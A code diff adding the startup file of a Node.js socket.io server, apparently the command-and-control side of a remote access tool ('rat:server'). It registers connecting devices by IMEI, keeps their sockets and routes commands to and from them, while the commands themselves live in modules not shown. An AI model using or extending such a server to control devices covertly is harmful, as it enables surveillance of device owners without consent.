@@ -1,0 +1,132 @@
+#!/usr/bin/env node
+
+/**
+ * Module dependencies.
+ */
+
+var app = require('../app');
+var debug = require('debug')('rat:server');
+var http = require('http');
+var userList
+/**
+ * Get port from environment and store in Express.
+ */
+
+var port = normalizePort(process.env.PORT || '3000');
+// app.set('port', port);
+
+/**
+ * Create HTTP server.
+ */
+var server = require('../app');
+const socketIO = require('socket.io')(server);
+
+/**
+ * command to clients
+ */
+const Cmd2Clients = require('../command/cmds/command2clients');
+const CmdFromClient = require('../command/cmds/commandFromClient');
+
+global.userMap = new Map();
+global.sockets = new Map();
+
+/**
+ * build the connection to clients and save all users' infomation
+ */
+socketIO.on('connection', (socket) => {
+
+  //listening the action when a client connect to the server
+  socket.on(Cmd2Clients.SYSTEM_INFO, (data) => {
+    saveUserInfo(socket, data);
+  })
+    .on('disconnected', (data) => {
+      console.log('a user disconnected');
+    });
+
+  //monitor all cmd when clients post to the server
+  global.cmder.forEach((value, key, map) => {
+    let cmd = key.substring(5, key.length);
+    socket.on(cmd, (data) => {
+      global.cmder.get(key).ownerAction(data);
+    });
+  });
+  global.socket = socketIO;
+});
+
+/**
+ * Listen on provided port, on all network interfaces.
+ */
+
+server.listen(port);
+server.on('error', onError);
+server.on('listening', onListening);
+
+/**
+ * Normalize a port into a number, string, or false.
+ */
+
+function normalizePort(val) {
+  var port = parseInt(val, 10);
+
+  if (isNaN(port)) {
+    // named pipe
+    return val;
+  }
+
+  if (port >= 0) {
+    // port number
+    return port;
+  }
+
+  return false;
+}
+
+/**
+ * Event listener for HTTP server "error" event.
+ */
+
+function onError(error) {
+  if (error.syscall !== 'listen') {
+    throw error;
+  }
+
+  var bind = typeof port === 'string'
+    ? 'Pipe ' + port
+    : 'Port ' + port;
+
+  // handle specific listen errors with friendly messages
+  switch (error.code) {
+    case 'EACCES':
+      console.error(bind + ' requires elevated privileges');
+      process.exit(1);
+      break;
+    case 'EADDRINUSE':
+      console.error(bind + ' is already in use');
+      process.exit(1);
+      break;
+    default:
+      throw error;
+  }
+}
+
+/**
+ * Event listener for HTTP server "listening" event.
+ */
+
+function onListening() {
+  var addr = server.address();
+  var bind = typeof addr === 'string'
+    ? 'pipe ' + addr
+    : 'port ' + addr.port;
+  debug('Listening on ' + bind);
+}
+function saveUserInfo(socket, data) {
+  let userInfo = JSON.parse(data); //each clients userInfo
+  console.log('a user connect'
+    + '\n'
+    + data);
+  global.userMap.set(userInfo.IMEI, socket.id)  //save the IMEI to global to recorgnize the client
+  console.log("current user count :" + global.userMap.size); // record the count of all clients
+  global.sockets.set(userInfo.IMEI, socket);
+
+}
